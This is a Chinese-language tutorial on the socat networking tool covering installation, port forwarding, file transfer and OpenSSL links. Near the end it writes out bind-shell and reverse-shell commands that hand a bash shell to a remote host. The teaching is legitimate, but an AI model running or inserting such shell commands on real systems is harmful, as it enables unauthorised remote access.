---
description: 'https://www.hi-linux.com/posts/61543.htmlSocat 是 Linux 下的一个多功能的网络工具，名字来由是 「Socket CAT」。其功能与有瑞士军刀之称的 Netcat 类似，可以看做是 Netcat 的加强版。Socat 的主要特点就是在两个数据流之间建立通道，且支持众多协议和链接方式。如 IP、TCP、 UDP、IPv6、PIPE、EXEC、System、Open、Proxy、Openssl、 Socket等。Socat 的官方网站：http://www.dest-unreach.org/socat/CentosDeb'
lastUpdated: '2025-12-06 10:50:00'
head: 
  - - meta
    - name: 'og:title'
      content: 'Socat 入门教程 - 奇妙的 Linux 世界'
  - - meta
    - name: 'og:type'
      content: 'article'
  - - meta
    - name: 'og:description'
      content: 'https://www.hi-linux.com/posts/61543.htmlSocat 是 Linux 下的一个多功能的网络工具，名字来由是 「Socket CAT」。其功能与有瑞士军刀之称的 Netcat 类似，可以看做是 Netcat 的加强版。Socat 的主要特点就是在两个数据流之间建立通道，且支持众多协议和链接方式。如 IP、TCP、 UDP、IPv6、PIPE、EXEC、System、Open、Proxy、Openssl、 Socket等。Socat 的官方网站：http://www.dest-unreach.org/socat/CentosDeb'
  - - meta
    - name: 'og:url'
      content: 'https://www.wulicode.com/man/extend-reading/socat.html'
---
# Socat 入门教程 - 奇妙的 Linux 世界



[https://www.hi-linux.com/posts/61543.html](https://www.hi-linux.com/posts/61543.html)



Socat 是 Linux 下的一个多功能的网络工具，名字来由是 「Socket CAT」。其功能与有瑞士军刀之称的 Netcat 类似，可以看做是 Netcat 的加强版。

Socat 的主要特点就是在两个数据流之间建立通道，且支持众多协议和链接方式。如 IP、TCP、 UDP、IPv6、PIPE、EXEC、System、Open、Proxy、Openssl、 Socket等。

Socat 的官方网站：[http://www.dest-unreach.org/socat/](http://www.dest-unreach.org/socat/)

### Socat 安装

- 通过源码方式安装

```java
$ wget http://www.dest-unreach.org/socat/download/socat-1.7.3.2.tar.gz
$ tar zxf socat-1.7.3.2.tar.gz
$ cd socat-1.7.3.2
$ ./configure $ make   
$ make install
```

- 通过包安装 (推荐)

Centos

<table><tbody>
  <tr>
    <td> <code>1</code> </td>
    <td> <code>$ yum install -y socat</code> </td>
  </tr>
</tbody></table>

Debian/Ubuntu

<table><tbody>
  <tr>
    <td> <code>1</code> </td>
    <td> <code>$ apt-get install -y socat</code> </td>
  </tr>
</tbody></table>

macOS

<table><tbody>
  <tr>
    <td> <code>1</code> </td>
    <td> <code>$ brew install socat</code> </td>
  </tr>
</tbody></table>

### Socat 基本语法

<table><tbody>
  <tr>
    <td> <code>1</code> </td>
    <td> <code>socat [options] &lt;address&gt; &lt;address&gt;</code> </td>
  </tr>
</tbody></table>

其中这 2 个 address 就是关键了，address 类似于一个文件描述符，Socat 所做的工作就是在 2 个 address 指定的描述符间建立一个 pipe 用于发送和接收数据。几个常用的 address 描述方式如下：

- ,STDIN,STDOUT 表示标准输入输出，可以就用一个横杠代替。
- /var/log/syslog 打开一个文件作为数据流，可以是任意路径。
- TCP:: 建立一个 TCP 连接作为数据流，TCP 也可以替换为 UDP 。
- TCP-LISTEN: 建立 一个 TCP 监听端口，TCP 也可以替换为 UDP。
- EXEC: 执行一个程序作为数据流。

以上规则中前面的 TCP 等都可以小写，在这些描述后可以附加一些选项，用逗号隔开。如 fork，reuseaddr，stdin，stdout，ctty 等。

### Socat 使用实例

### 文件操作

- 通过 Socat 读取文件

<table><tbody>
  <tr>
    <td> <code>12345</code> </td>
    <td> <code># 从绝对路径读取$ socat - /var/www/html/flag.php # 从相对路径读取$ socat - ./flag.php</code> </td>
  </tr>
</tbody></table>

> 

- 写入文件

<table><tbody>
  <tr>
    <td> <code>1</code> </td>
    <td> <code>$ echo &quot;This is Test&quot; | socat - /tmp/hello.html</code> </td>
  </tr>
</tbody></table>

### 网络管理

- 连接远程端口

<table><tbody>
  <tr>
    <td> <code>1</code> </td>
    <td> <code>$ socat - TCP:192.168.1.252:3306</code> </td>
  </tr>
</tbody></table>

- 监听一个新端口

<table><tbody>
  <tr>
    <td> <code>1</code> </td>
    <td> <code>$ socat TCP-LISTEN:7000 -</code> </td>
  </tr>
</tbody></table>

### 端口转发

在实际生产中我们经常会遇到到一个场景就是，用一台机器作为转发服务器，连接 AB 两个网段，将转发服务器的某个端口上的流量转发到 B 网段的某台机器的某个端口，这样 A 网段的服务器就可以通过访问转发服务器上的端口访问到 B 网段的服务器端口。

这样的场景一般在和客户建立专线的连接时候经常用到，一般也可以采用 iptables 做转发，但是比较复杂。Socat 可以很轻松的完成这个功能，但是 Socat 不支持端口段转发，只适用于单端口或者少量端口。

- 转发 TCP

监听 192.168.1.252 网卡的 15672 端口，并将请求转发至 172.17.0.15 的 15672 端口。

<table><tbody>
  <tr>
    <td> <code>1</code> </td>
    <td> <code>$ socat  -d -d -lf /var/log/socat.log TCP4-LISTEN:15672,bind=192.168.1.252,reuseaddr,fork TCP4:172.17.0.15:15672</code> </td>
  </tr>
</tbody></table>

参数说明：

<table><tbody>
  <tr>
    <td> <code>123456</code> </td>
    <td> <code>1. -d -d  前面两个连续的 -d -d 代表调试信息的输出级别。2. -lf /var/log/socat.log 指定输出信息的文件保存位置。 3. TCP4-LISTEN:15672 在本地建立一个 TCP IPv4 协议的监听端口，也就是转发端口。这里是 15672，请根据实际情况改成你自己需要转发的端口。4. bind 指定监听绑定的 IP 地址，不绑定的话将监听服务器上可用的全部 IP。5. reuseaddr 绑定一个本地端口。6. fork TCP4:172.17.0.15:15672 指的是要转发到的服务器 IP 和端口，这里是 172.17.0.15 的 15672 端口。</code> </td>
  </tr>
</tbody></table>

- 转发 UDP

转发 UDP 和 TCP 类似，只要把 TCP4 改成 UDP4 就行了。

<table><tbody>
  <tr>
    <td> <code>1</code> </td>
    <td> <code>$ socat -d -d -lf /var/log/socat.log UDP4-LISTEN:123,bind=192.168.1.252,reuseaddr,fork UDP4:172.17.0.15:123</code> </td>
  </tr>
</tbody></table>

- NAT 映射

在一个 NAT 网络环境中，也是可以通过 Socat 将内部机器端口映射到公网上的。

在外部公网机器上执行

<table><tbody>
  <tr>
    <td> <code>1</code> </td>
    <td> <code>$ socat tcp-listen:1234 tcp-listen:3389</code> </td>
  </tr>
</tbody></table>

在内部私网机器上执行

<table><tbody>
  <tr>
    <td> <code>1</code> </td>
    <td> <code>$ socat tcp:outerhost:1234 tcp:192.168.1.34:3389</code> </td>
  </tr>
</tbody></table>

这样，你外部机器上的 3389 就映射在内网 192.168.1.34 的 3389 端口上了。不过这样场景下更推荐内网穿透神器 FRP，如果你不会使用，可参考「[推荐一款很好用的内网穿透工具–FRP](https://mp.weixin.qq.com/s/8HeeDC5x5xozElN8GzQLLw)」一文。

### 文件传递

- 文件传送

将文件 demo.tar.gz 使用 2000 端口从 192.168.1.252 传到 192.168.1.253,文件传输完毕后会自动退出。

在 192.168.1.252 上执行

<table><tbody>
  <tr>
    <td> <code>1</code> </td>
    <td> <code>$ socat -u open:demo.tar.gz tcp-listen:2000,reuseaddr</code> </td>
  </tr>
</tbody></table>

在 192.168.1.253 上执行

<table><tbody>
  <tr>
    <td> <code>1</code> </td>
    <td> <code>$ socat -u tcp:192.168.1.252:2000 open:demo.tar.gz,create</code> </td>
  </tr>
</tbody></table>

> 

- 读写分流功能

Socat 具有一个独特的读写分流功能，比如：可以实现一个假的 Web Server，客户端连过来之后就把 read.html 里面的内容传过去，同时把客户端的数据保存到 write.txt 里面。

<table><tbody>
  <tr>
    <td> <code>1</code> </td>
    <td> <code>$ socat open:read.html\!\!open:write.txt,create,append tcp-listen:8000,reuseaddr,fork</code> </td>
  </tr>
</tbody></table>

> 

### 其它功能

- 监听一个 TCP 端口

<table><tbody>
  <tr>
    <td> <code>1</code> </td>
    <td> <code>$ socat tcp-listen:12345 -</code> </td>
  </tr>
</tbody></table>

- 向 TCP 端口发送数据

<table><tbody>
  <tr>
    <td> <code>1</code> </td>
    <td> <code>$ echo &quot;test&quot; | socat - tcp-connect:127.0.0.1:12345</code> </td>
  </tr>
</tbody></table>

- 监听一个 UDP 端口

<table><tbody>
  <tr>
    <td> <code>1</code> </td>
    <td> <code>$ socat udp-listen:23456 -</code> </td>
  </tr>
</tbody></table>

- 向一个 UDP 端口发送数据

<table><tbody>
  <tr>
    <td> <code>1</code> </td>
    <td> <code>$ echo &quot;test&quot; | socat - udp-connect:127.0.0.1:23456</code> </td>
  </tr>
</tbody></table>

- 监听一个 Unix Socket

<table><tbody>
  <tr>
    <td> <code>1</code> </td>
    <td> <code>$ socat unix-listen:/tmp/unix.socket -</code> </td>
  </tr>
</tbody></table>

- 向本地 Unix Socket 发送数据

<table><tbody>
  <tr>
    <td> <code>1</code> </td>
    <td> <code>$ echo &quot;test&quot; | socat - unix-connect:/tmp/unix.sock</code> </td>
  </tr>
</tbody></table>

- 监听本地 Unix Datagram Socket

<table><tbody>
  <tr>
    <td> <code>1</code> </td>
    <td> <code>$ socat unix-recvfrom:/tmp/unix.dg.sock -</code> </td>
  </tr>
</tbody></table>

- 向本地 Unix Datagram Socket 发送数据

<table><tbody>
  <tr>
    <td> <code>1</code> </td>
    <td> <code>$ echo &quot;test&quot; | socat - unix-sendto:/tmp/unix.dg.sock</code> </td>
  </tr>
</tbody></table>

- 通过 Openssl 来加密传输过程

假设有一个服务器主机，地址为  `server.domain.org` 。 并且服务端程序使用 4433 端口。为了尽可能的简单，我们使用一个非常简单的服务功能，即服务端仅回显数据（echo），客户端只进行标准输入（stdio）。要进行 Openssl 加密数据传输，首先需要生成 Openssl 证书。

- 生成服务端的证书

<table><tbody>
  <tr>
    <td> <code>12345678</code> </td>
    <td> <code># 为服务端的证书取一个基本的名字。$ FILENAME=server# 生成公钥私钥对。$ openssl genrsa -out $FILENAME.key 1024# 生成一个自签名的证书，会提示你输入国家代号、姓名等，或者按下回车键跳过输入提示。$ openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt# 用刚生成的密钥文件和证书文件来生成PEM文件。$ cat $FILENAME.key $FILENAME.crt &gt;$FILENAME.pem</code> </td>
  </tr>
</tbody></table>

服务端证书生成完成后，复制信任证书 server.crt 到 SSL 客户端所在的主机上。

- 生成客户端证书

<table><tbody>
  <tr>
    <td> <code>12</code> </td>
    <td> <code># 为客户端证书取一个不同的文件名$ FILENAME=client</code> </td>
  </tr>
</tbody></table>

重复上述服务端生成证书的流程。然后复制 client.pem 到 SSL 客户端主机，复制 client.crt 到服务端主机。至此完成了证书交换，服务端有 server.pem、client.crt 两个文件，客户端有 client.pem 、server.crt 两个文件。

其次我们需要建立 Openssl 服务端，在服务端我们不再用 tcp-listen (tcp-l) ，而用 openssl-listen (ssl-l) 。cert 参数告诉 Socat 包含证书和私钥的文件，cafile 参数指向客户端的证书文件。如果客户端能提供相关联的私钥，我们则认为该连接是可靠的。

<table><tbody>
  <tr>
    <td> <code>1</code> </td>
    <td> <code>$ socat openssl-listen:4433,reuseaddr,cert=server.pem,cafile=client.crt echo</code> </td>
  </tr>
</tbody></table>

运行这个命令后，Socat 会在 4433 端口监听，并要求客户端进行身份验证。

最后在客户端建立一个加密的链接，用 openssl-connect 或者 ssl 替换你的 tcp-connect 或 tcp 地址关键字，然后添加 cert 和 cafile 选项。

<table><tbody>
  <tr>
    <td> <code>123</code> </td>
    <td> <code>$ socat stdio openssl-connect:server.domain.org:4433,cert=client.pem,cafile=server.crttesttest</code> </td>
  </tr>
</tbody></table>

这个命令用来建立一个到服务程序的安全的连接。如果服务端和客户端成功建立连接后，会回显在客户端输入的内容。

- 建立一个正向 Shell

- 服务端

<table><tbody>
  <tr>
    <td> <code>1234</code> </td>
    <td> <code># 在服务端 7005 端口建立一个 Shell。$ socat TCP-LISTEN:7005,fork,reuseaddr EXEC:/bin/bash,pty,stderr或者$ socat TCP-LISTEN:7005,fork,reuseaddr system:bash,pty,stderr</code> </td>
  </tr>
</tbody></table>

- 客户端

<table><tbody>
  <tr>
    <td> <code>12</code> </td>
    <td> <code># 连接到服务器的 7005 端口，即可获得一个 Shell。readline 是 GNU 的命令行编辑器，具有历史功能。$ socat readline tcp:127.0.0.1:7005</code> </td>
  </tr>
</tbody></table>

- 反弹一个交互式的 Shell

当有主机连接服务端的 7005 端口时，将会发送客户端的 Shell 给服务端。

- 服务端

<table><tbody>
  <tr>
    <td> <code>1</code> </td>
    <td> <code>$ socat -,raw,echo=0 tcp-listen:7005</code> </td>
  </tr>
</tbody></table>

- 客户端

<table><tbody>
  <tr>
    <td> <code>1</code> </td>
    <td> <code>$ socat tcp-connect:192.168.1.252:7005 exec:&#039;bash -li&#039;,pty,stderr,setsid,sigint,sane</code> </td>
  </tr>
</tbody></table>

- fork 服务

将一个使用标准输入输出的单进程程序变为一个使用 fork 方法的多进程服务，非常方便。

<table><tbody>
  <tr>
    <td> <code>1</code> </td>
    <td> <code>$ socat TCP-LISTEN:1234,reuseaddr,fork EXEC:./helloworld</code> </td>
  </tr>
</tbody></table>

- 不同设备的通信

将 U 盘进行网络共享

<table><tbody>
  <tr>
    <td> <code>1</code> </td>
    <td> <code>$ socat -d -d /dev/ttyUSB1,raw,nonblock,ignoreeof,cr,echo=0 TCP4-LISTEN:5555,reuseaddr</code> </td>
  </tr>
</tbody></table>

- 将终端转发到串口

<table><tbody>
  <tr>
    <td> <code>1</code> </td>
    <td> <code>$ socat READLINE,/dev/ttyS0,raw,echo=0,crnl</code> </td>
  </tr>
</tbody></table>

- 让 Socat 后台运行

默认情况下 Socat 只在前台运行，如果要让 Socat 一直在后台运行，可以使用 nohup 命令来保证其在后台一直运行。

<table><tbody>
  <tr>
    <td> <code>1</code> </td>
    <td> <code>$ nohup socat  -d -d -lf /var/log/socat.log TCP4-LISTEN:15672,bind=192.168.1.252,reuseaddr,fork TCP4:172.17.0.15:15672 &amp;</code> </td>
  </tr>
</tbody></table>

除了 nohup 外，Linux 下让进程在后台运行的方法还很多，比如：screen、tmux 等。

在 Linux 中一切都是文件，无论是 Socket 还是其他设备。所以从理论上来说，一切能够在文件层级访问的内容都可以成为 Socat 的数据流的来源。2 个 address 可以任意发挥，能够做到的事情还有很多。这样比起来，Socket 的确比 Netcat 更加强大。

### 参考文档

[https://www.google.com](https://www.google.com/)

[http://t.cn/R3X3HV3](http://t.cn/R3X3HV3)

[http://t.cn/R3X3u1o](http://t.cn/R3X3u1o)

[http://t.cn/R3XB1oh](http://t.cn/R3XB1oh)

[http://t.cn/R3aIcrh](http://t.cn/R3aIcrh)

[http://t.cn/R39vQ0v](http://t.cn/R39vQ0v)

[http://t.cn/R395hiP](http://t.cn/R395hiP)

[http://t.cn/R399TKv](http://t.cn/R399TKv)

阅读全文

